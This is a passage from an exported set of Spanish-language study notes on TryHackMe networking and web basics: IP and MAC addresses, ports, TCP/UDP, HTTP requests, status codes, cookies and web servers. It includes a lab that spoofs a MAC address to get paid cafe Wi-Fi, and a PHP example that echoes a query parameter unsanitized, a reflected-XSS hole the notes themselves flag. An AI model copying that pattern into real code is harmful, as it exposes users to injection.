86.157.52.21   | Public              |\n| CMNatic-PC      | 192.168.1.74   | Private             |\n| CMNatic-PC      | 86.157.52.21   | Public              |\nDESKTOP y CMNatic serán capaces de usar sus IPs privadas para comunicarse entre ellos. De todas formas cualquier información transmitida a través de internet deberá ser comunicada usando las direcciones IP públicas.\n\nLas direcciones IP públicas son asignadas mediante ISP (Internet Service Provider).\n\n------------------\nA medida que los dispositivos existentes aumentan en el mundo, se está volviendo más complicado asignar IPs dentro del protocolo IPv4. Es por esto que se origina IPv6 (2^32 vs 2^128 direcciones IP) resolviendo el principal problema de IPv4. De cualquier forma este es un proceso lento.\n\n---------------------------\n<h2>Direcciones MAC</h2>\nCada dispositivo en una red tiene una interfaz física con una dirección MAC única, asignada de fábrica. Esta dirección es un código hexadecimal de 12 caracteres (como `a4:c3:f0:85:ac:2d`), donde los primeros seis dígitos identifican al fabricante y los últimos seis son un identificador único del dispositivo.\n\nSin embargo, las direcciones MAC pueden falsificarse (*spoofing*), lo que permite que un dispositivo se haga pasar por otro. Esto puede engañar sistemas de seguridad mal configurados, como un firewall que permita acceso basado solo en la MAC de un administrador.\n\nEn redes públicas (cafés, hoteles), el control por MAC a veces se usa para gestionar accesos o ofrecer servicios premium. Aunque útil, este método no es totalmente seguro si no se combina con otras medidas de protección.\n\nLas direcciones MAC identifican dispositivos, pero su suplantación revela vulnerabilidades en redes que dependen exclusivamente de ellas para la seguridad.\n\n-----------------\n<h2>Practica</h2>\n>*El laboratorio simula una red Wi-Fi de cafetería donde tienes que pagar por el servicio.*\n\n1. ![[Pasted image 20250410220242.png]]\n2. Cambiamos la MAC a la misma que la de Alice (MAC spoofing):![[Pasted image 20250410220339.png]]"
  },
  {
    "title": "0. What is Networking",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/1-what-is-networking/0-what-is-networking/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/1. What is Networking/0. What is Networking.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 1. What is Networking",
    "content": "[[1. What is Networking]]\n[[2. What is the Internet]]\n[[3. Identifying Devices on a Network]]\n[[4. Ping (ICMP)]]\n"
  },
  {
    "title": "4. Ports 101 (Practical)",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/4-packets-and-frames/4-ports-101-practical/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/4. Packets and Frames/4. Ports 101 (Practical).md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 4. Packets and Frames",
    "content": "Los puertos son puntos esenciales en los cuales la información se intercambia. Poniento un símil marítimo, aquellos barcos que quieren atracar en un puerto, deben hacerlo en un espacio compatible con sus cualidades.\n\nEn informática los puertos se representan con números desde el 0 hasta el 65535. Al haber tantos, si no lleváramos una cuenta sería un caos. Es por ello que existen ciertos estándares básicos de comunicación (como HTTP) destinados en puertos fijos a lo largo de todos los ordenadores del mundo. Por eso todos los sesrvidores web mandan la informaciión al puerto 80.\n\nTodos los puertos entre el 0 y el 1024 se conocen como puertos comunes. Algunos de los más conocidos son:\n\n| **Protocolo**                                                      | **Número de puerto** | **Descripción**                                                                                          |\n| ------------------------------------------------------------------ | -------------------- | -------------------------------------------------------------------------------------------------------- |\n| **F**ile **T**ransfer **P**rotocol (**FTP**)                       | 21                   | Se usa para compartir archivos y/o descargarlos                                                          |\n| **S**ecure **Sh**ell (**SSH**)                                     | 22                   | Se usa para conectarse de forma remota a un equipo.                                                      |\n| **H**yper**T**ext Transfer Protocol (**HTTP**)                     | 80                   | Este protocolo hace funcionar la WWW. El buscador usa esto para descargar imágenes y videos de las webs. |\n| **H**yper**T**ext **T**ransfer **P**rotocol **S**ecure (**HTTPS**) | 443                  | Hace lo mismo que la de arriba pero de forma segura con encriptación.                                    |\n| **S**erver **M**essage **B**lock (**SMB**)                         | 445                  | Es similar a FTP pero a parte de archivos permite tambien compartir dispositivos, como impresoras.       |\n| **R**emote **D**esktop **P**rotocol (**RDP**)                      | 3389                 | Sirve para conectarse remotamente a un equipo, pero con interfaz gráfica.                                |\n[Lista de los 1024 puertos](http://www.vmaxx.net/techinfo/ports.htm)\n\nPuedes cambiar los puertos para tus servivios (por ejemplo correr un servicio wed en el puerto 8000) pero los servidores asumirán que está en el 80 por defecto, por lo que tendrás que añadir dos puntos `:` para añadir el puerto `<dirección_ip>:<puerto>`.\n\n----------------------------------\n<h2>Práctica</h2>\n\n1. ![[000.png]]\n2. ![[001.png]]"
  },
  {
    "title": "1. What are Packets and Frames",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/4-packets-and-frames/1-what-are-packets-and-frames/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/4. Packets and Frames/1. What are Packets and Frames.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 4. Packets and Frames",
    "content": "Son pequeñas piezas de información que, al combinarse todas juntas forman una pieza mayor.\n\nUn frame (o marco) está en el nivel [[3. Layer 2 - Data Link]], queriendo esto decir que no contiene información tal como la dirección IP. Wl frame sería, por así decirlo, el sobre de una carta (sin remitente ni destino).\n\nEste proceso es llamado encapsulación, del que hablamos en [[1. What is the OSI Model]]. En esta fase cuando hablamos de direcciones IP, estamos hablando del marco en sí. \n\nLos paquetes son una forma eficiente de comunicar información a través de una red. Gracias al tamaño pequeño de los paquetes es fácil de evitar los cuellos de botella. El archivo final es reconstruido a partir de los paquetes mandados en el dispositivo de destino.\n\nDebido a que hay diferentes estructuras de paquetes, si no hubiera estndarización, podría romper las comunicaciones. Es por esto que existen Headers, que amplían información sobre los paquetes mandados:\n\n| **Header**          | **Descripción**                                                                                      |\n| ------------------- | ---------------------------------------------------------------------------------------------------- |\n| Time to Live        | Pone un temporizador de expiración para que los paquetes que no son recibidos no saturen la red      |\n| Checksum            | Este campo le sirve a los protocolos como TCP/IP para comprobar si ha habido pérdida de información. |\n| Source Address      | Contiene la dirección IP de la máquina desde la que se mandan los datos.                             |\n| Destination Address | Contiene la dirección IP de la máquina hacia la que se mandan los datos.                             |\n"
  },
  {
    "title": "3. UDP-IP",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/4-packets-and-frames/3-udp-ip/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/4. Packets and Frames/3. UDP-IP.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 4. Packets and Frames",
    "content": "Es un protocolo sin estados, no como TCP.\n\nAlgunas ventajas y desventajas de UDP frente a TCP:\n\n| **Ventajas de UDP**                                                                | **Desventajas de UDP**                                         |\n| ---------------------------------------------------------------------------------- | -------------------------------------------------------------- |\n| UDP es muchi mas rápido que TCP.                                                   | A UDP no le importa si la información es recibida              |\n| UDP deja la aplicacion para decidir si hay control sobre cómo de rápido se mandan. | Es flexible para los desarrolladores de software               |\n| UDP no reserva una conexión                                                        | Las conexiones inestables resultan en una experiencia nefasta. |\nComo mencionamos anteriormente, no existe proceso que forme una conexión entre dispositivos. Los headers de UDP son menos y los paquetes más sencillos:\n\n| **Header**          | **Descripción**                                                                      |\n| ------------------- | ------------------------------------------------------------------------------------ |\n| Time to Live (TTL)  | Tiempo de expiración dell paquete.                                                   |\n| Source Address      | La dirección IP del dispositivo que manda la información.                            |\n| Destination Address | La dirección IP del dispositivo que recibe la información.                           |\n| Source Port         | Puerto entre el 0 y el 65535 que no esté en uso desde donde se envía la información. |\n| Destination Port    | Puerto entre el 0 y el 65535 donde se encuentra corriendo el servicio receptor.      |\n| Data                | Almacena la informcaión del envío.                                                   |\nUDP es stateless (sin estado). Eso quiere decir que la conexión se ve de esta manera:\n\n1. Request - Client.\n2. Response - Server."
  },
  {
    "title": "0. Packets and Frames",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/4-packets-and-frames/0-packets-and-frames/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/4. Packets and Frames/0. Packets and Frames.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 4. Packets and Frames",
    "content": "[[1. What are Packets and Frames]]\n[[2. TCP-IP (Three-Way Handshake)]]\n[[3. UDP-IP]]\n[[4. Ports 101 (Practical)]]\n"
  },
  {
    "title": "2. TCP-IP (Three-Way Handshake)",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/2-network-fundamentals/4-packets-and-frames/2-tcp-ip-three-way-handshake/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/2. Network Fundamentals/4. Packets and Frames/2. TCP-IP (Three-Way Handshake).md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 2. Network Fundamentals > 4. Packets and Frames",
    "content": "TCP es otra de estas reglas usada en el networking ([[1. What is Networking]]).\n\nEste protocolo es muy similar al modelo OSI que hemos discutido en [[1. What is the OSI Model]]. Este protocolo consiste de cuatro capas y es como una versión resumida del modelo OSI. Las capas son:\n\n- Application.\n- Transporte.\n- Internet.\n- Network Interface.\n\nMuy similar a como funciona el modelo OSI, se añade información en cada capa (encapsulación).\n\nTCP es connection-based, lo que quiere decir qye debe establecer una conexión entre el servidor y el cliente antes de mandar información.\n\nTCP garantiza la entrega precisa de la información. Este proceso se conoce como Three-Way Handshake. Algunas ventajas y desventajas de TCP son:\n\n| **Ventajas de TCP**                                                                           | **Desventajas de TCP**                                                                                                            |\n| --------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------- |\n| Garantiza la integridad de la información.                                                    | Necesita una conexión fiable entre los dos dispositivos. Cualquier paquete pasado incorrecto queda inválido y hay que reenviarlo. |\n| Capaz de conecar dos dispositivos y evitar que se saturen de información en orden incorrecto. | Una conexión lenta puede causar cuello de botella en el otro dispositivo porque se reserva la conexión entre ellos.               |\n| Hace un montón más de procesos y comprobaciones                                               | Bastante más lento que UDP por ese motivo.                                                                                        |\nLos paquetes TCP contienen varias secciones, con información, conocidas como Headers:\n\n| Header                 | Descripcion                                                                                                                                                                                                        |\n| ---------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |\n| Source Port            | Contiene el valor del puerto desde el cual se manda el paquete. Entre el 0 y el 65535 (que no esté siendo ya utilizado).                                                                                           |\n| Destination Port       | Contiene el valor del puerto donde corre el servicio en la máquina receptora (puerto 80 para web por ejemplo).                                                                                                     |\n| Source IP              | Dirección IP del dispositivo que manda el paquete.                                                                                                                                                                 |\n| Destination IP         | Dirección IP del dispositivo que recibe el paquete.                                                                                                                                                                |\n| Sequence Number        | Cuando se establece una conexión, la primera parte de la información transmitida es un número random.                                                                                                              |\n| Acknowledgement Number | Después de la primera comunicación, la siguiente tendrá el numero de secuencia + 1.                                                                                                                                |\n| Checksum               | Es lo que le da la fiabilidad a TCP. Del lado emisor se hace una comrpobación de hash. Después de haberse recibido, del lado receptor se hace una comprobación de hash y si no coinciden el archivo está corrupto. |\n| Data                   | La parte donde la información que está siendo transmitida se almacena.                                                                                                                                             |\n| Flag                   | Este header determina como serán trataados los paquetes de cada lado. Diferentes flags llevarán a diferentes tratamientos                                                                                          |\nVamos a explorar el Three-Way Handshake, el término usado para el proceso de conexión entre dos dispositivos. Un Three-Way Handshake ocurre de la siguiente manera:\n\n| **Paso** | **Mensaje** | **Descripción**                                                                                                                    |\n| -------- | ----------- | ---------------------------------------------------------------------------------------------------------------------------------- |\n| 1        | SYN         | Es el paquete inicial mandado por el cliente. Es usado para iniciar la comunicación.                                               |\n| 2        | SYN/ACK     | Es mandado por el servidor para establecer que el SYN ha sido recibido.                                                            |\n| 3        | ACK         | Puede ser usado tanto por el servidor como por el cliente para establecer que una serie de paquetes se han recibido correctamente. |\n| 4        | DATA        | Una vez que la conexión está establecida, la información se manda mendiante el paquete DATA.                                       |\n| 5        | FIN         | Este paquete se utiliza para cerrar correctamente la conexión entre los dispositivos después de la comunicación.                   |\n| #        | RST         | Este paquete termina la comunicación de manera abrupta y es la manera de decir que hubo un error.                                  |\n1. SYN - Cliente: Aquí esta mi ISN (Initial Sequence Number) para SYNcronizarte (0).\n2. SYN/ACK - Server: Aquí está mi ISN (5000) y yo ACKnoledge (reconozco) tu ISN (0).\n3. ACK - Cliente: Yo ACK tu ISN (5000) y aquí hay algo de mi información ISN +1 (1).\n\n![[000.jpg]]\n\n------------------------\n<h3>Cerrando una conexión con TCP</h3>\nTCP cerrará una conexión una vez que sea sabido que el otro dispositivo hay recibido correctamente toda la información.\n\nPara iniciar la finalización de la comunicación se manda un paquete FIN. El otro dispositivo hace un ACK del FIN del otro y manda un FIN suyo. Por último el primer dispositivo hace un ACK del FIN del segundo.\n\n![[001.png]]\n"
  },
  {
    "title": "2. Other Components",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/4-putting-it-all-together/2-other-components/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/4. Putting it All Together/2. Other Components.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 4. Putting it All Together",
    "content": "<h2>Load Balancers</h2>\nCuando el tráfico de una página web empieza a volverse demasiado alto o está corriendo una plicación que necesita alta disponibilidad, puede que un solo servidor web ya no sirva. Los balanceadores de carga (load balancers) tienen dos características principales:\n\n1. Asegurar que las páginas con mucho tráfico pueden soportar la carga.\n2. Ofrecer una alternativa si un servidor se cae.\n\nCuando haces una petición a una página con un load balancer, este recibirá tu petición y la redirigirá a uno de los servidores que tiene detrás. Tiene diferentes algoritmos para elegir a donde mandarlo:\n\n- Round-Robin: Se lo manda a cada servidor por turnos.\n- Weighted: Comprueba cuántas peticiones tiene cada servidor y lo manda al menos ocupado.\n\nLos load balancers también realizan comprobaciones periódicas (health check) con cada servidor para asegurar que todo vaya bien. Si alguno no responde adecuadamente, dejará de enviar información hasta que vuelva a hacerlo.\n\n------------------------\n<h2>CDN (Content Delivery Networks)</h2>\nPuede ser un recurso excelente para reducir el tráfico de un servidor saturado. Permite hostear archivos estáticos como JS, CSS, imágenes o vídeos en miles de servidores diferentes alrededor del mundo. Cuando un usuario hace una petición de alguno de ellos, se busca el camino más corto (físicamente) y se pide de ahí en vez de, potencialmente, la otra punta del mundo.\n\n-------------------\n<h2>Databases</h2>\nPor lo general, las páginas web necesitan una forma de almacenar información para sus usuarios. Los servidores web pueden comunicarse con las bases de datos para almacenar y/o acceder. Estas pueden variar desde archivos en texto plano hasta grupos complejos de múltiples servidores ofreciendo rapidez y resiliencia. Algunas de las más comunes que encontrarás son: MySQL, MSSQL, MongoDB, Postgres, etc. Cada una tiene sus cualidades específicas.\n\n-------------------\n<h2>WAF (Web Application Firewall)</h2>\nUn WAF está entre tu petición y el servidor web. Su propósito principal es proteger el servidor de ataque como el DoS (Denial of Service). Analiza las peticiones en busca de técnicas de ataque comunes o si la petición viene de un servidor real o de un bot. También utiliza rate limiting para controlar las peticiones excesivas desde una IP, permitiendo sólo unas cuantas desde una misma IP. Si una petición se interpreta como posible ataque se dropeará y nunca será enviada al servidor."
  },
  {
    "title": "1. Putting it All Together",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/4-putting-it-all-together/1-putting-it-all-together/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/4. Putting it All Together/1. Putting it All Together.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 4. Putting it All Together",
    "content": "Hemos aprendido que detrás de entrar a una página web hay muchas partes que se deben juntar. Para resumir, cuando hacemos una petición a una página web, nuestro ordenador necesita saber la IP del servidor y para esto usa el DNS. Después el ordenador habla con el servidor usando un conjunto de comandos llamado HTTP. Entonces el servidor devuelve HTML, JS, CSS, imágenes, etc. Tu buscador entonces usa el formato correcto para enseñar la página web."
  },
  {
    "title": "3. How Web Servers Work",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/4-putting-it-all-together/3-how-web-servers-work/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/4. Putting it All Together/3. How Web Servers Work.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 4. Putting it All Together",
    "content": "<h2>¿Qué es un servidor web?</h2>\nUn servidor web es un software escuchando el tráfico entrante que después utiliza HTTP para responder contenido web a los clientes. Los más comunes son Apache, Nginx, IIS y NodeJS. Todos devuelven archivos desde lo que se conoce como root directory, o directorio raíz. Por ejemplo, Nginx y Apache comparten la misma ruta por defecto: */var/www/html* en los sistemas operativos Linux y IIS usa *C:\\inetpub\\wwwroot* para los sistemas operativos Windows. Así, si pediste http://www.ejemplo.com/foto,jpg, te devolvería /var/www/html/foto.jpg del disco duro local.\n\n------------------\n<h2>Hosts virtuales</h2>\nLos servidores web pueden albergar múltiples sitios web con diferentes dominios. Para conseguir esto usan virtual hosts (archivos de configuración basados en texto).El software del servidor web comprueba el nombre siendo pedido por HTTP. Si encuentra una correspondencia, la página web pedida se mostrará. Si no, se mostrará la página por defecto.\n\nLos virtual hosts pueden tener su directorio raíz mapeado en diferentes lugares del disco duro, por ejemplo, one.com mapeado a /var/www/html/website_one y two.com mapeado a /var/www/html/website_two. No hay límite para el número de páginas que puedes hostear en un solo servidor.\n\n-------------\n<h2>Contenido estático vs dinámico</h2>\nEl contenido estático nunca cambia, como JS, CSS, imágenes, etc. También incluye al HTML que no cambia. Por el otro lado el contenidod dinámico si que cambia dependiendo de las peticiones. Como la búsqueda en la web por palabras, o mostrar las últimas entradas de un blog.\n\nLos cambios que acabamos viendo se hacen en el Backend con el uso de leguajes de scripting. Se llama así porque se hace detrás de la escena. Todo lo que vemos en el buscador es Frontend.\n\n------------------------\n<h2>Lenguajes de scripting y backend</h2>\nNo hay mucho límite en cuanto a lo que el Backend puede conseguir y es esto lo que hace que una página sea interactiva para el usuario. Algunos ejemplos de esto son: PHP, Python, Ruby, NodeJS, Perl... Estos lenguajes pueden interactuar con bases de datos, llamar a servicios externos, procesar informació del usuario... Un ejemplo sería si hicieras una petición al sitio web: *http://ejemplo.com/index.php?name=adam*\n\nSi el index.php estuviera construido así:\n\n```php\n<html>\n\t<body>\n\t\tHello <?php echo $_GET[\"name\"]; ?>\n\t</body>\n</html>\n```\n\nAparecería el siguiente resultado:\n\n```html\n<html>\n\t<body>\n\t\tHello adam\n\t</body>\n</html>\n```\n\nNotarás que el cliente realmente no ve el PHP, porque este es un lenguaje de Backend. Esta interactividad abre muchos problemas de seguridad para las aplicaciones web que no han sido creadas seguramente o sanitizadas."
  },
  {
    "title": "0. Putting it All Together",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/4-putting-it-all-together/0-putting-it-all-together/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/4. Putting it All Together/0. Putting it All Together.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 4. Putting it All Together",
    "content": "[[1. Putting it All Together]]\n[[2. Other Components]]\n[[3. How Web Servers Work]]\n"
  },
  {
    "title": "3. HTTP Methods",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/2-http-in-detail/3-http-methods/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/2. HTTP in Detail/3. HTTP Methods.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 2. HTTP in Detail",
    "content": "Los métodos HTTP son una manera para el cliente de enseñar sus intenciones al hacer una petición. Los más comunes son:\n\n- GET: Toma información del servidor web.\n- POST: Sube información al servidor, creando nuevos records.\n- PUT: Es usado para subir datos para actualizar la información.\n- DELETE: Usado parra borrar registros/información del servidor.\n"
  },
  {
    "title": "5. Headers",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/2-http-in-detail/5-headers/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/2. HTTP in Detail/5. Headers.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 2. HTTP in Detail",
    "content": "Los headers son trozos adicionales de información que podemos mandar al servidor web cuando hacemos peticiones. Aunque no hay headers estrictamente necesarios al hacer una petición HTTP, será difícil de ver una web correctamente sin ellos.\n\nAlgunos headers de petición comunes son:\n\n- Host: Algunos servidores web albergan múltiples sitios web así que especificando el host podemos decirle cuál requerimos.\n- User-Agent: Este es el software del buscador y el número de la versión. Esto ayuda al servidor a mostrar el formato correcto.\n- Content-Length: Le dice al servidor cuánta información esperar, de esta manera evitamos perder información.\n- Accept-Encoding: Le dice al servidor que tipos de métodos de compresión soporta de tal manera que la información se hace más pequeña (comprime) para su transporte por internet.\n- Cookie: Información mandada al servidor para ayudarle a recordar tu información.\n\nAlgunos headers de respuesta comunes son:\n\n- Set-Cookie: Información a guardar que es mandada de vuelta al servidor en cada petición.\n- Cache-Control: Cuánto tiempo guardar el contenido de la respuesta en la memoria caché del servidor antes de tener que pedirla de nuevo.\n- Content-Type: Le especifica al cliente el tipo de información que está siendo devuelta.\n- Content-Encoding: Qué tipo de método ha sido usado para comprimir la información para su transporte por internet.\n"
  },
  {
    "title": "4. HTTP Status Codes",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/2-http-in-detail/4-http-status-codes/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/2. HTTP in Detail/4. HTTP Status Codes.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 2. HTTP in Detail",
    "content": "<h2>Códigos de estado HTTP</h2>\nEn la lección anterior ([[3. HTTP Methods]]) hemos visto que la primera línea de la respuesta contiene un código que le indica al cliente el estado de la petición. Estos códigos pueden descomponerse en 5 secciones:\n\n| Rango                              | Descripción                                                                                                                           |\n| ---------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------- |\n| **100-199 - Information Response** | Sirven para decirle al cliente que la primera parte de su petición ha sido procesada correctamente y que necesitan seguir enviándola. |\n| **200-299 - Success**              | Usado para indicarle al cliente que su petición fue exitosa.                                                                          |\n| **300-399 - Redirection**          | Estos son usados para redirigir al cliente a otro recurso.                                                                            |\n| **400-499 - Client Errors**        | Informa al cliente de que hubo un error durante su petición.                                                                          |\n| **500-599 - Server Errors**        | Reservado a los errores del lado del servidor.                                                                                        |\n\n----------------------\n<h2>Códigos de estado HTTP comunes</h2>\nHay muchos códigos de estado HTTP, y eso sin incluir que las páginas pueden crear los suyos propios. Algunos de los más comunes son:\n\n| Respuesta                        | Descripción                                                                                                   |\n| -------------------------------- | ------------------------------------------------------------------------------------------------------------- |\n| **200 - OK**                     | Completado exitosamente.                                                                                      |\n| **201 - Created**                | Un nuevo recurso ha sido creado (usuario o blogpost).                                                         |\n| **301 - Moved Permanently**      | Redirige al buscador del cliente a una nueva página o le dice que ha sido movida y que mire allí en su lugar. |\n| **302 - Found**                  | Igual que el de arriba pero es temporal.                                                                      |\n| **400 - Bad Request**            | Le dice al buscador que algo fue mal o faltaba algo en la petición                                            |\n| **401 - Not Authorised**         | Te resalta que no estás autorizado a para ver este recurso.                                                   |\n| **403 - Forbidden**              | No tienes permiso apra ver esto ya estés loggeado o no.                                                       |\n| **405 - Method Not Allowed**     | El recurso no admite ese método (le mandas un GET a un recurso de creación de usuarios).                      |\n| **404 - Page Not Found**         | La página tal cuel fue escrita no se ha encontrado.                                                           |\n| **500 - Internal Service Error** | El servidor se ha encontrado con un problema en tu petición y no sabe cómo manejarla.                         |\n| **503 - Service Unavailable**    | El servidor no puede procesar tu solicitud por estar saturado o cerrado por mantenimiento.                    |\n"
  },
  {
    "title": "0. HTTP in Detail",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/2-http-in-detail/0-http-in-detail/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/2. HTTP in Detail/0. HTTP in Detail.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 2. HTTP in Detail",
    "content": "[[1. What is HTTP(S)_]]\n[[2. Requests and Responses]]\n[[3. HTTP Methods]]\n[[4. HTTP Status Codes]]\n[[5. Headers]]\n[[6. Cookies]]\n"
  },
  {
    "title": "2. Requests and Responses",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/2-http-in-detail/2-requests-and-responses/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/2. HTTP in Detail/2. Requests and Responses.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 2. HTTP in Detail",
    "content": "Cuando accedemos a una web, el buscador necesitará hacer peticiones al servidor web para descargar activos como HTML, imágenes o vídeos. Primero necesitas decirle al buscador dónde y cómo acceder a estos recursos. A ello ayudan las URL's.\n\n---------------------------------\n<h2>¿Qué es una URL?</h2>\nUna URL es una instrucción de como acceder a un recurso en internet.\n\n![[015.png]]\n- Scheme: Indica qué protocolo utilizar.\n- User: Algunos servicios requieren autentificación.\n- Host: Nombre de dominio o dirección IP del servidor al que deseas acceder.\n- Port: Puerto al que te vas a conectar (80 para HTTP).\n- Path: Nombre del archivo o ruta del recurso al que vas a acceder.\n- Query String: Bits extra de información que mandas al path. Por ejemplo, blog?id=1.\n- Fragment: Referencia a la localización de la página pedida.\n\n-------------------------------\n<h2>Haciendo una petición</h2>\nEs posible hacer una petición al servidor con sólo una línea GET / HTTP/1.1:\n\n![[016.png]]\nPero para una experiencia más rica en la web, necesitamos mandar otra información también. Esta se manda en lo que se conoce como headers. Un ejemplo de petición:\n\n```vb.net\nGET / HTTP/1.1\nHost: tryhackme.com\nUser-Agent: Mozilla/5.0 Firefox/87.0\nReferer: https://tryhackme.com/\n\n```\n\n1. Línea 1: Esta petición manda el método GET, pidiendo la página home con \"/\" y diciedo que usa el protocolo HTTP en la versión 1.1\n2. Línea 2: Le decimos al servidor web que queremos la web tryhackme.com\n3. Línea 3: Le decimos al servidor web que usamos el buscador Firefox en su versión 87\n4. Línea 4: Le decimos al servidor que la página web que nos dirigió a esta fue https://tryhackme.com\n5. Línea 5: Las peticiones HTTP finalizan con una línea en blanco para indicarle al servidor que la petición ha terminado.\n\n--------------------------\n<h2>Recibiendo una respuesta</h2>\nEjemplo de respuesta:\n\n```vb.net\nHTTP/1.1 200 OK\nServer: nginx/1.15.8\nDate: Fri, 09 Apr 2021 13:34:03 GTM\nContent-Type: text/html\nContent-Length: 98\n\n<html>\n\t<head>\n\t\t<title>TryHackMe</title>\n\t</head>\n\t<body>\n\t\tWelcome To TryHackMe.com\n\t</body>\n</html>\n\n```\n\n1. Línea 1: HTTP 1.1 es la versión del protocolo HTTP que el servidor está usando seguida del código de estado HTTP, en este caso \"200 OK\" que nos indica que se ha completado de manera existosa.\n2. Línea 2: Esto nos dice el software del servidor web y la versión.\n3. Línea 3: La fecha actual, tiempo y zona horaria del servidor.\n4. Línea 4: Los headers content-type le indica al cliente el tipo de información que será mandada (HTML, imágenes, vídeos, pdf, XML...).\n5. Línea 5: El header content-length le indica al cliente cómo de larga la respuesta es. De esta manera podemos confirmar que no falta información.\n6. Línea 6: La respuesta HTTP contiene una línea en blanco para indicar que la respuesta ha terminado.\n7. Línea 7-14: La información que ha sido pedida, en este caso la página home."
  },
  {
    "title": "1. What is HTTP(S)_",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/2-http-in-detail/1-what-is-http-s-_/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/2. HTTP in Detail/1. What is HTTP(S)_.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 2. HTTP in Detail",
    "content": "<h2>¿Qué es HTTP?</h2>\n\nHyperText Transfer Protocol es un protocolo usado cuando visitas una página web. Desarrollado por Tim Berners-Lee y su equipo entre 1989-1991. HTTP es un set de reglas usadas para comunicarse cn los servidores web para transmitir la información de la web, imágenes, vídeos, etc.\n\n-----------------------------\n<h2>¿Qué es HTTPS?</h2>\nHiperText Transfer Protocol Secure es la versión segura de HTTP. Encripta la información de tal manera que no sólo para los intentos de terceros de leerla sino también te da seguridad de que el servidor al que le estás hablando es legítimo."
  },
  {
    "title": "6. Cookies",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/2-http-in-detail/6-cookies/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/2. HTTP in Detail/6. Cookies.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 3. How the Web Works > 2. HTTP in Detail",
    "content": "Seguramente hayas oído hablar de cookies antes. Son una pequeña pieza de información qye está guardada en tu ordenador. Son guardadas cuando recibes un Set-Cookie header de un servidor web. Después, cada petición que hagas mandará la cookie de vuelta al servidor. Ya que HTTP es statekless y no guarda información sobre tus peticioines previas, la cookie se manda para ayudar al servidor a recordar quién eres.\n\n![[017.png]]\nLas cookies pueden ser usadas oara muchos propósitos pero son comunmente más usadas para autentificarse de cara a un servidor. La cookie, de todas formas, no será un texto claro, sino una string encriptada.\n\nPuedes fácilmente ver qué cookies el servidor está mandando a la página web usando las herramientas de desarrollador (F12). Una vez allí te diriges a \"Network\"."
  },
  {
    "title": "2. HTML",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/3-how-the-web-works/3-how-websites-work/2-html/",
